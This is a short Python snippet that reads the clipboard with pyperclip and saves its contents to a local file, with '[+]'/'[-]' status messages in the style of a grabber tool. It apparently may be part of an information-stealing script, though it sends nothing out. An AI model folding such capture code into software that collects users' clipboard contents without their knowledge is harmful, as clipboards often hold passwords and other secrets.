import pyperclip
def get_clipboard_data():
    try:
        data = pyperclip.paste()
        with open("clipboard.txt", "w", encoding="utf-8") as file:
            file.write("=== Clipboard Contents ===\n")
            file.write(data if data else "Clipboard is empty.")
        print("[+] Clipboard data captured.")
    except Exception as e:
        print(f"[-] Failed to get clipboard data: {e}")
# This function captures the clipboard data and writes it to a file named "clipboard.txt".



